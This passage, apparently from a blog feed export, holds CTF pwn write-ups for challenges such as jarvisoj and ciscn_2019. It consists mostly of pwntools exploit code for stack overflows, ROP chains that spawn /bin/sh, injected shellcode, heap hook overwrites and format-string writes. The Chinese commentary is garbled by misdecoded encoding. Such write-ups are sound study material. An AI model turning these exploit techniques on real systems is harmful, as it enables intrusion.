<span class="hljs-number">32</span> payload += asm(shellcraft.sh())p.sendline(payload)</code></pre><h1 id="0x14-jarvisoj-level0">0x14:jarvisoj_level0<a class="post-anchor" href="#0x14-jarvisoj-level0"></a></h1><p><code>payload = &quot;a&quot;*0x88+p64(0x0000000000400596)p.sendline(payload)</code></p><h1 id="0x15-ciscn-2019-ne-5">0x15:ciscn_2019_ne_5<a class="post-anchor" href="#0x15-ciscn-2019-ne-5"></a></h1><p><code>&#39;a&#39;*0x4c+p32(elf.sym[&#39;system&#39;])+p32(0xdeadbeef)+p32(0x80482ea)</code></p><h1 id="0x16-jarvisoj-level2">0x16:jarvisoj_level2<a class="post-anchor" href="#0x16-jarvisoj-level2"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">"Input:\n"</span>)binsh = <span class="hljs-number">0x0804A024</span>payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(elf.plt[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(binsh)p.sendline(payload)</code></pre><h1 id="0x17-ciscn-2019-n-5">0x17:ciscn_2019_n_5<a class="post-anchor" href="#0x17-ciscn-2019-n-5"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">'tell me your name'</span>)p.sendline(asm(shellcraft.sh()))payload=<span class="hljs-string">'a'</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x601080</span>)p.recvuntil(<span class="hljs-string">'What do you want to say to me?'</span>)p.sendline(payload)</code></pre><h1 id="0x18-ciscn-2019-final-3">0x18:ciscn_2019_final_3<a class="post-anchor" href="#0x18-ciscn-2019-final-3"></a></h1><p>ä¿æŠ¤å…¨å¼€æŒ‡é’ˆæœªæ¸…é›¶</p><p>æ³„éœ²libcåœ°å€ä¸€èˆ¬é€šè¿‡unsortbinï¼Œå­˜åœ¨tcacheçš„æƒ…å†µä¸‹ï¼Œ64ä½ç¨‹åºéœ€è¦ç”³è¯·è¶…è¿‡0x400å¤§å°chunkï¼Œfreeä¹‹åæ‰èƒ½è¿›unsortbin</p><pre><code class="hljs python">heap = add(<span class="hljs-number">0</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">"aa"</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">"aa"</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">2</span>,<span class="hljs-number">11</span>):add(i,<span class="hljs-number">0x78</span>,<span class="hljs-string">"aa"</span>)add(<span class="hljs-number">12</span>,<span class="hljs-number">0x28</span>,<span class="hljs-string">'aa'</span>)remove(<span class="hljs-number">12</span>)remove(<span class="hljs-number">12</span>)ls(<span class="hljs-string">"heap addr"</span>,heap)add(<span class="hljs-number">13</span>,<span class="hljs-number">0x28</span>,p64(heap<span class="hljs-number">-0x10</span>))add(<span class="hljs-number">14</span>,<span class="hljs-number">0x28</span>,p64(heap<span class="hljs-number">-0x10</span>))add(<span class="hljs-number">15</span>,<span class="hljs-number">0x28</span>,p64(<span class="hljs-number">0</span>)+p64(<span class="hljs-number">0x421</span>))remove(<span class="hljs-number">0</span>)remove(<span class="hljs-number">1</span>)add(<span class="hljs-number">16</span>,<span class="hljs-number">0x78</span>,<span class="hljs-string">'a'</span>)add(<span class="hljs-number">17</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'a'</span>)<span class="hljs-comment"># libc.address=add(18,0x18,'g')-0x3ebca0</span>libc_base=add(<span class="hljs-number">18</span>,<span class="hljs-number">0x18</span>,<span class="hljs-string">'g'</span>)<span class="hljs-number">-0x3ebca0</span><span class="hljs-comment">#9   get libc</span>malloc_hook=libc_base+libc.sym[<span class="hljs-string">'__malloc_hook'</span>]one_gadget=libc_base+<span class="hljs-number">0x10a38c</span>print(hex(libc_base),hex(malloc_hook))<span class="hljs-comment">#dup</span>remove(<span class="hljs-number">5</span>)remove(<span class="hljs-number">5</span>)add(<span class="hljs-number">19</span>,<span class="hljs-number">0x78</span>,p64(malloc_hook))add(<span class="hljs-number">20</span>,<span class="hljs-number">0x78</span>,p64(malloc_hook))add(<span class="hljs-number">21</span>,<span class="hljs-number">0x78</span>,p64(one_gadget))</code></pre><p><a href="https://blog.csdn.net/github_36788573/article/details/103599951" target="_blank" rel="noopener">https://blog.csdn.net/github_36788573/article/details/103599951</a></p><h1 id="0x19-ciscn-2019-es-2">0x19:ciscn_2019_es_2<a class="post-anchor" href="#0x19-ciscn-2019-es-2"></a></h1><h1 id="0x1A-roarctf-2019-easy-pwn">0x1A:roarctf_2019_easy_pwn<a class="post-anchor" href="#0x1A-roarctf-2019-easy-pwn"></a></h1><h1 id="0x1B-jarvisoj-level2-x64">0x1B:jarvisoj_level2_x64<a class="post-anchor" href="#0x1B-jarvisoj-level2-x64"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">"Input:\n"</span>)binsh = <span class="hljs-number">0x0000000000600A90</span>payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>)payload += p64(<span class="hljs-number">0x00000000004006b3</span>)+p64(binsh)+p64(elf.plt[<span class="hljs-string">'system'</span>])p.sendline(payload)</code></pre><h1 id="0x1C-roarctf-2019-easy-pwn">0x1C:roarctf_2019_easy_pwn<a class="post-anchor" href="#0x1C-roarctf-2019-easy-pwn"></a></h1><pre><code class="hljs python">calloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#0</span>calloc(<span class="hljs-number">0x18</span>)<span class="hljs-comment">#1</span>calloc(<span class="hljs-number">0x88</span>)<span class="hljs-comment">#2</span>calloc(<span class="hljs-number">0x28</span>)<span class="hljs-comment">#3</span>calloc(<span class="hljs-number">0x28</span>)<span class="hljs-comment">#4</span>calloc(<span class="hljs-number">0x68</span>)<span class="hljs-comment">#5</span>calloc(<span class="hljs-number">0x10</span>)edit(<span class="hljs-number">0</span>,<span class="hljs-number">0x18</span>+<span class="hljs-number">10</span>,<span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>+p8(<span class="hljs-number">0xB1</span>))free(<span class="hljs-number">1</span>)calloc(<span class="hljs-number">0xA8</span>)<span class="hljs-comment">#1</span>edit(<span class="hljs-number">1</span>,<span class="hljs-number">0x20</span>,<span class="hljs-string">"a"</span>*<span class="hljs-number">0x18</span>+p64(<span class="hljs-number">0x91</span>))free(<span class="hljs-number">2</span>)show(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">"content: aaaaaaaaaaaaaaaaaaaaaaaa\x91\x00\x00\x00\x00\x00\x00\x00"</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-3951480</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)edit(<span class="hljs-number">3</span>,<span class="hljs-number">0x28</span>+<span class="hljs-number">10</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">0x28</span>+p8(<span class="hljs-number">0xa1</span>))free(<span class="hljs-number">4</span>)free(<span class="hljs-number">5</span>)calloc(<span class="hljs-number">0x98</span>)<span class="hljs-comment">#4</span>edit(<span class="hljs-number">2</span>,<span class="hljs-number">0x38</span>,<span class="hljs-string">'b'</span>*<span class="hljs-number">0x28</span>+p64(<span class="hljs-number">0x71</span>)+p64(libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<span class="hljs-number">-0x23</span>))calloc(<span class="hljs-number">0x68</span>)calloc(<span class="hljs-number">0x68</span>)edit(<span class="hljs-number">5</span>,<span class="hljs-number">27</span>,<span class="hljs-string">'a'</span>*(<span class="hljs-number">0x13</span><span class="hljs-number">-8</span>)+p64(libc.address+<span class="hljs-number">0x4526a</span>)+p64(libc.sym[<span class="hljs-string">'__libc_realloc'</span>]+<span class="hljs-number">16</span>))<span class="hljs-comment"># calloc(0x20)</span></code></pre><p><a href="https://blog.csdn.net/github_36788573/article/details/103674651" target="_blank" rel="noopener">å‚è€ƒ</a></p><h1 id="0x1D-jarvisoj-level3-x64">0x1D:jarvisoj_level3_x64<a class="post-anchor" href="#0x1D-jarvisoj-level3-x64"></a></h1><pre><code class="hljs python">rdi_ret = <span class="hljs-number">0x00000000004006b3</span>rsi_ret =<span class="hljs-number">0x00000000004006b1</span>payload =  <span class="hljs-string">"a"</span>* (<span class="hljs-number">0x88</span>)payload += p64(rdi_ret)+p64(<span class="hljs-number">1</span>)+p64(rsi_ret)+p64(elf.got[<span class="hljs-string">'write'</span>])+p64(<span class="hljs-number">8</span>)payload += p64(elf.plt[<span class="hljs-string">'write'</span>])+p64(elf.symbols[<span class="hljs-string">'main'</span>])p.sendline(payload)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>)[<span class="hljs-number">-6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))-libc.sym[<span class="hljs-string">'write'</span>]payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x88</span> + p64(rdi_ret) + p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next()) + p64(libc.sym[<span class="hljs-string">'system'</span>])p.sendline(payload)p.interactive()</code></pre><h1 id="0x1E-PWN">0x1E:PWN<a class="post-anchor" href="#0x1E-PWN"></a></h1><pre><code class="hljs python">main = <span class="hljs-number">0x804849B</span>leave_ret = <span class="hljs-number">0x08048511</span>p.recvuntil(<span class="hljs-string">"name?"</span>)payload = p32(elf.plt[<span class="hljs-string">'write'</span>])+p32(main)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">'write'</span>])+p32(<span class="hljs-number">4</span>)p.send(payload)p.recvuntil(<span class="hljs-string">"say?"</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>payload += p32(<span class="hljs-number">0x0804A300</span><span class="hljs-number">-4</span>)+p32(leave_ret)p.send(payload)libc.address=u32(p.recvuntil(<span class="hljs-string">"Hello"</span>,<span class="hljs-literal">True</span>))-libc.symbols[<span class="hljs-string">'write'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)p.recvuntil(<span class="hljs-string">"name?"</span>)payload = p32(libc.symbols[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(libc.search(<span class="hljs-string">'/bin/sh\x00'</span>).next())p.sendline(payload)p.recvuntil(<span class="hljs-string">"say?"</span>)payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>payload += p32(<span class="hljs-number">0x0804A300</span><span class="hljs-number">-4</span>)+p32(leave_ret)p.sendline(payload)</code></pre><h1 id="0x1F-jarvisoj-tell-me-something">0x1F:jarvisoj_tell_me_something<a class="post-anchor" href="#0x1F-jarvisoj-tell-me-something"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">":\n"</span>)p.send(<span class="hljs-string">"a"</span>*<span class="hljs-number">0x88</span>+p64(<span class="hljs-number">0x400620</span>))</code></pre><h1 id="0x20-jarvisoj-level3">0x20:jarvisoj_level3<a class="post-anchor" href="#0x20-jarvisoj-level3"></a></h1><pre><code class="hljs python">main=<span class="hljs-number">0x08048484</span>p.recvuntil(<span class="hljs-string">":\n"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(elf.plt[<span class="hljs-string">'write'</span>])+p32(main)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">'write'</span>])+p32(<span class="hljs-number">4</span>)p.send(payload)libc.address=u32(p.recvuntil(<span class="hljs-string">"In"</span>,<span class="hljs-literal">True</span>))-libc.sym[<span class="hljs-string">'write'</span>]ls(<span class="hljs-string">"libc addr"</span>,libc.address)p.recvuntil(<span class="hljs-string">":\n"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)payload += p32(libc.sym[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(libc.search(<span class="hljs-string">'/bin/sh'</span>).next())p.send(payload)</code></pre><h1 id="0x21-jarvisoj-level4">0x21:jarvisoj_level4<a class="post-anchor" href="#0x21-jarvisoj-level4"></a></h1><pre><code class="hljs python">main=<span class="hljs-number">0x0804844B</span>payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(elf.plt[<span class="hljs-string">'write'</span>])+p32(main)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">'write'</span>])+p32(<span class="hljs-number">4</span>)p.send(payload)libc=u32(p.recv(<span class="hljs-number">4</span>))<span class="hljs-number">-0x0d43c0</span>ls(<span class="hljs-string">"libc addr"</span>,libc)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)payload += p32(libc+<span class="hljs-number">0x03a940</span>)+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(libc+<span class="hljs-number">0x15902b</span>)p.send(payload)</code></pre><h1 id="0x22-jarvisoj-fm">0x22:jarvisoj_fm<a class="post-anchor" href="#0x22-jarvisoj-fm"></a></h1><pre><code class="hljs python">x = <span class="hljs-number">0x0804A02C</span>payload = fmtstr_payload(<span class="hljs-number">11</span>,&#123;x:<span class="hljs-number">4</span>&#125;)p.send(payload)</code></pre><h1 id="0x23-ZJCTF-2019-Login">0x23:[ZJCTF 2019]Login<a class="post-anchor" href="#0x23-ZJCTF-2019-Login"></a></h1><pre><code class="hljs python">p.sendlineafter(<span class="hljs-string">"name: "</span>,<span class="hljs-string">"admin"</span>)payload = <span class="hljs-string">'2jctf_pa5sw0rd'</span>+<span class="hljs-string">'\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">20</span>+ <span class="hljs-string">'\x00'</span>+<span class="hljs-string">'a'</span>*<span class="hljs-number">36</span>+p64(<span class="hljs-number">0x000000000400E88</span>)p.sendlineafter(<span class="hljs-string">": "</span>,payload)</code></pre><h1 id="0x24-others-shellcode">0x24:others_shellcode<a class="post-anchor" href="#0x24-others-shellcode"></a></h1><p>cat flag</p><h1 id="0x25-bjdctf-2020-babystack">0x25:bjdctf_2020_babystack<a class="post-anchor" href="#0x25-bjdctf-2020-babystack"></a></h1><pre><code class="hljs python">sh = <span class="hljs-number">0x0000000000400858</span>rdi = <span class="hljs-number">0x0000000000400833</span>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x18</span>payload+= p64(rdi)+p64(sh)payload+= p64(elf.plt[<span class="hljs-string">'system'</span>])p.sendlineafter(<span class="hljs-string">":\n"</span>,<span class="hljs-string">'50'</span>)p.sendlineafter(<span class="hljs-string">"?\n"</span>,payload)</code></pre><h1 id="0x26-ciscn-2019-final-2">0x26:ciscn_2019_final_2<a class="post-anchor" href="#0x26-ciscn-2019-final-2"></a></h1><p>_fileno æ˜¯ç”¨æ¥è§„å®š fd æ‰€æŒ‡å‘çš„æ–‡ä»¶æµï¼Œstdin çš„ _fileno æ”¹æˆ 666</p><pre><code class="hljs python">add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)free(<span class="hljs-number">2</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)free(<span class="hljs-number">2</span>)show(<span class="hljs-number">2</span>)p.recvuntil(<span class="hljs-string">'your short type inode number :'</span>)addr = int(p.recvuntil(<span class="hljs-string">'\n'</span>, drop=<span class="hljs-literal">True</span>))<span class="hljs-number">-0xa0</span><span class="hljs-keyword">print</span> hex(addr)add(<span class="hljs-number">2</span>,addr)add(<span class="hljs-number">2</span>,addr)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x91</span>)ls(<span class="hljs-string">"addr"</span>,addr)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">0</span>, <span class="hljs-number">7</span>):    free(<span class="hljs-number">1</span>)    add(<span class="hljs-number">2</span>, <span class="hljs-number">0x20</span>)free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">'inode number :'</span>)libc.address = int(p.recvuntil(<span class="hljs-string">'\n'</span>, drop=<span class="hljs-literal">True</span>))<span class="hljs-number">-4111520</span>fileno = libc.sym[<span class="hljs-string">'_IO_2_1_stdin_'</span>]+<span class="hljs-number">0x70</span>ls(<span class="hljs-string">"fileno addr"</span>,fileno)add(<span class="hljs-number">1</span>,fileno)add(<span class="hljs-number">1</span>,<span class="hljs-number">0x30</span>)free(<span class="hljs-number">1</span>)add(<span class="hljs-number">2</span>,<span class="hljs-number">0x20</span>)free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)p.recvuntil(<span class="hljs-string">'inode number :'</span>)addr = int(p.recvuntil(<span class="hljs-string">'\n'</span>, drop=<span class="hljs-literal">True</span>))<span class="hljs-number">-0x30</span>add(<span class="hljs-number">1</span>, addr)add(<span class="hljs-number">1</span>, addr)add(<span class="hljs-number">1</span>, fileno)add(<span class="hljs-number">1</span>, <span class="hljs-number">666</span>)p.sendlineafter(<span class="hljs-string">'which command?\n&gt; '</span>, <span class="hljs-string">'4'</span>)p.recvuntil(<span class="hljs-string">'your message :'</span>)</code></pre><h1 id="0x27-jarvisoj-level1">0x27:jarvisoj_level1<a class="post-anchor" href="#0x27-jarvisoj-level1"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">"this:"</span>)addr = int(p.recvuntil(<span class="hljs-string">"?\n"</span>,<span class="hljs-literal">True</span>),<span class="hljs-number">16</span>)payload = asm(shellcraft.sh()).ljust(<span class="hljs-number">140</span>,<span class="hljs-string">"\x11"</span>)+p32(addr)p.sendline(payload)</code></pre><p>ä½†æ˜¯ç¨‹åºäº¤äº’æœ‰é—®é¢˜ï¼Œè¿œç¨‹ä¸èƒ½è·å–åˆ° buf çš„åœ°å€ï¼Œåªèƒ½æ¢ä¸€ç§åšæ³•</p><p>å¯ä»¥å‘ç°ç¨‹åºçš„bssæ®µæ˜¯å¯è¯»å¯å†™å¯æ‰§è¡Œçš„</p><pre><code class="hljs python">pop3_ret = <span class="hljs-number">0x08048549</span>payload = <span class="hljs-number">140</span> * <span class="hljs-string">"a"</span>payload += p32(elf.plt[<span class="hljs-string">'read'</span>])payload += p32(pop3_ret)payload += p32(<span class="hljs-number">0</span>)payload += p32(elf.bss())payload += p32(<span class="hljs-number">0x300</span>)payload += p32(elf.bss())p.sendline(payload)p.sendline(asm(shellcraft.sh()))</code></pre><h1 id="0x28-hitcontraining-uaf">0x28:hitcontraining_uaf<a class="post-anchor" href="#0x28-hitcontraining-uaf"></a></h1><pre><code class="hljs python">magic = <span class="hljs-number">0x8048945</span>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">"aaaaaaaaaaaaaaaa"</span>) <span class="hljs-comment"># add note 0</span>addnote(<span class="hljs-number">16</span>, <span class="hljs-string">"bbbbbbbbbbbbbbbb"</span>) <span class="hljs-comment"># add note 1</span>delnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># delete note 0</span>delnote(<span class="hljs-number">1</span>) <span class="hljs-comment"># delete note 1</span>addnote(<span class="hljs-number">8</span>, p32(magic)) <span class="hljs-comment"># add note 2</span><span class="hljs-comment">#gdb.attach(p)</span>printnote(<span class="hljs-number">0</span>) <span class="hljs-comment"># print note 0</span></code></pre><h1 id="0x29-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop">0x29:é“äººä¸‰é¡¹(ç¬¬äº”èµ›åŒº)_2018_rop<a class="post-anchor" href="#0x29-é“äººä¸‰é¡¹-ç¬¬äº”èµ›åŒº-2018-rop"></a></h1><pre><code class="hljs python">main = <span class="hljs-number">0x080484C6</span>payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(elf.plt[<span class="hljs-string">'write'</span>])+p32(main)+p32(<span class="hljs-number">1</span>)+p32(elf.got[<span class="hljs-string">'write'</span>])+p32(<span class="hljs-number">4</span>)p.send(payload)libc.address = u32(p.recv(<span class="hljs-number">4</span>))-libc.sym[<span class="hljs-string">'write'</span>]payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x88</span>+<span class="hljs-number">4</span>)+p32(libc.sym[<span class="hljs-string">'system'</span>])+p32(<span class="hljs-number">0xdeadbeef</span>)+p32(libc.search(<span class="hljs-string">'/bin/sh'</span>).next())p.send(payload)</code></pre><h1 id="0x2A-jarvisoj-test-your-memory">0x2A:jarvisoj_test_your_memory<a class="post-anchor" href="#0x2A-jarvisoj-test-your-memory"></a></h1><pre><code class="hljs python">p.recvuntil(<span class="hljs-string">"------Test Your Memory!-------\n\n"</span>)key = p.recvuntil(<span class="hljs-string">"\n"</span>,<span class="hljs-literal">True</span>)hint = <span class="hljs-number">0x080487E0</span><span class="hljs-keyword">print</span> key<span class="hljs-comment"># gdb.attach(p)</span>payload = key.ljust(<span class="hljs-number">23</span>,<span class="hljs-string">"\x00"</span>)payload += p32(elf.plt[<span class="hljs-string">'system'</span>])+p32(hint)+p32(hint)p.sendline(payload)</code></pre><p>è¿™é“é¢˜è¿”å›åœ°å€éšä¾¿å†™ä¸ªæ— æ•ˆåœ°å€ä¼šå‡ºç°è¯»ä¸å‡ºæ¥flagçš„é—®é¢˜ï¼Œè¿˜æ˜¯æ‰¾ä¸ªæœ‰æ•ˆçš„åœ°å€</p><h1 id="0x2B-bjdctf-2020-babyrop">0x2B:bjdctf_2020_babyrop<a class="post-anchor" href="#0x2B-bjdctf-2020-babyrop"></a></h1><pre><code class="hljs python">rdi_ret = <span class="hljs-number">0x0000000000400733</span>p.recvuntil(<span class="hljs-string">"story!\n"</span>)payload = <span class="hljs-string">"a"</span>*(<span class="hljs-number">0x20</span>+<span class="hljs-number">8</span>)payload += p64(rdi_ret)+p64(elf.got[<span class="hljs-string">"read"</span>])+p64(elf.plt[<span class="hljs-string">'puts'</span>])+p64(<span class="hljs-number">0x4006AD</span>)p.send(payload)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))-libc.sym[<span class="hljs-string">'read'</span>]payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x28</span>payload += p64(rdi_ret) + p64(libc.search(<span class="hljs-string">"/bin/sh\x00"</span>).next()) + p64(libc.sym[<span class="hljs-string">'system'</span>])p.recvuntil(<span class="hljs-string">"story!\n"</span>)p.send(payload)</code></pre><h1 id="0x2C-å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF">0x2C:å¼ºç½‘æ¯2019 æ‹Ÿæ€ STKOF<a class="post-anchor" href="#0x2C-å¼ºç½‘æ¯2019-æ‹Ÿæ€-STKOF"></a></h1><h1 id="0x2D-ciscn-2019-es-1">0x2D:ciscn_2019_es_1<a class="post-anchor" href="#0x2D-ciscn-2019-es-1"></a></h1><pre><code class="hljs python">malloc(<span class="hljs-number">0x410</span>,<span class="hljs-string">'aaaaaaa'</span>,<span class="hljs-string">'aaaa'</span>)malloc(<span class="hljs-number">0x68</span>,<span class="hljs-string">"a"</span>,<span class="hljs-string">"b"</span>)malloc(<span class="hljs-number">0x10</span>,<span class="hljs-string">'/bin/sh\x00'</span>,<span class="hljs-string">'aaaa'</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)p.recvuntil(<span class="hljs-string">"name:\n"</span>)libc.address = u64(p.recvuntil(<span class="hljs-string">"\x7f"</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">"\x00"</span>))<span class="hljs-number">-4111520</span>ls(<span class="hljs-string">"libc addr"</span>,libc.address)free(<span class="hljs-number">1</span>)free(<span class="hljs-number">1</span>)malloc(<span class="hljs-number">0x68</span>,p64(libc.sym[<span class="hljs-string">'__free_hook'</span>]),<span class="hljs-string">'141'</span>)malloc(<span class="hljs-number">0x68</span>,<span class="hljs-string">'111'</span>,<span class="hljs-string">'142'</span>)malloc(<span class="hljs-number">0x68</span>,p64(libc.sym[<span class="hljs-string">'system'</span>]),<span class="hljs-string">'143'</span>)free(<span class="hljs-number">2</span>)</code></pre><h1 id="0x2E-ciscn-2019-es-7">0x2E:ciscn_2019_es_7<a class="post-anchor" href="#0x2E-ciscn-2019-es-7"></a></h1>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>2019å›½èµ›çº¿ä¸Šèµ›wp</title>
      <link href="/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/"/>
      <url>/2019/12/14/2019%E5%9B%BD%E8%B5%9B%E7%BA%BF%E4%B8%8A%E8%B5%9Bwp/</url>
      
        <content type="html"><![CDATA[<blockquote><p>å¥½ä¹…æ²¡æœ‰å¤ç°é¢˜ç›®äº†ï¼Œåˆ©ç”¨å¤ä¹ å‘¨å’Œå¯’å‡å¤ç°ä¸€ä¸‹è¿™ä¸€å¹´çš„é¢˜ç›®</p></blockquote><h1 id="pwn">pwn<a class="post-anchor" href="#pwn"></a></h1><h2 id="baby-pwn">baby_pwn<a class="post-anchor" href="#baby-pwn"></a></h2><pre><code class="hljs c"><span class="hljs-keyword">ssize_t</span> vuln()&#123;  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [esp+0h] [ebp-28h]</span>  <span class="hljs-keyword">return</span> read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">0x100</span>u);&#125;</code></pre><p>ç¨‹åºåªæœ‰ä¸€ä¸ª read å‡½æ•°</p><p>ç¨‹åºåªå¼€å¯äº† NX ä¿æŠ¤</p><pre><code class="hljs python"><span class="hljs-keyword">from</span> roputils <span class="hljs-keyword">import</span> *fpath = <span class="hljs-string">'./pwn'</span>offset = <span class="hljs-number">44</span>rop = ROP(fpath)addr_bss = rop.section(<span class="hljs-string">'.bss'</span>)buf = rop.retfill(offset)buf += rop.call(<span class="hljs-string">'read'</span>, <span class="hljs-number">0</span>, addr_bss, <span class="hljs-number">100</span>)buf += rop.dl_resolve_call(addr_bss+<span class="hljs-number">20</span>, addr_bss)p = Proc(rop.fpath)p.write(p32(len(buf)) + buf)<span class="hljs-keyword">print</span> <span class="hljs-string">"[+] read: %r"</span> % (buf)buf = rop.string(<span class="hljs-string">'/bin/sh'</span>)buf += rop.fill(<span class="hljs-number">20</span>, buf)buf += rop.dl_resolve_data(addr_bss+<span class="hljs-number">20</span>, <span class="hljs-string">'system'</span>)buf += rop.fill(<span class="hljs-number">100</span>, buf)p.write(buf)p.interact(<span class="hljs-number">0</span>)</code></pre><h2 id="daily">daily<a class="post-anchor" href="#daily"></a></h2><pre><code class="hljs c"><span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"Daily choice"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"1.show the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"2.add a new pages"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"3.change the things in the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"4.remove the things in the daily"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"5.exit"</span>);<span class="hljs-built_in">puts</span>(<span class="hljs-string">"============================"</span>);<span class="hljs-built_in">printf</span>(<span class="hljs-string">"Your choice:"</span>);<span class="hljs-keyword">return</span> __readfsqword(<span class="hljs-number">0x28</span>u) ^ v0;</code></pre><p>èœå•é¢˜ç›®</p><pre><code class="hljs bash">âœ  daily checksec pwn[*] <span class="hljs-string">'/ctf/CTF-platform/windows/2019/guosai/pwn/daily/pwn'</span>    Arch:     amd64-64-little    RELRO:    Full RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)</code></pre><p><strong>freeå‡½æ•°</strong></p><pre><code class="hljs c"><span class="hljs-keyword">unsigned</span> __<span class="hljs-function">int64 <span class="hljs-title">sub_400BA9</span><span class="hljs-params">()</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-14h]</span>  <span class="hljs-keyword">char</span> buf; <span class="hljs-comment">// [rsp+10h] [rbp-10h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  v3 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-keyword">if</span> ( dword_602040 )  &#123;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">"Please enter the index of daily:"</span>);    read(<span class="hljs-number">0</span>, &amp;buf, <span class="hljs-number">8u</span>LL);    v1 = atoi(&amp;buf);    <span class="hljs-keyword">if</span> ( *(_QWORD *)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] )    &#123;      <span class="hljs-built_in">free</span>(*(<span class="hljs-keyword">void</span> **)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>]);      *(_QWORD *)&amp;dword_602060[<span class="hljs-number">4</span> * v1 + <span class="hljs-number">2</span>] = <span class="hljs-number">0L</span>L;      dword_602060[<span class="hljs-number">4</span> * v1] = <span class="hljs-number">0</span>;      <span class="hljs-built_in">puts</span>(<span class="hljs-string">"remove successful!!"</span>);      --dword_602040;    &#125;    <span class="hljs-keyword">else</span>    &#123;      <span 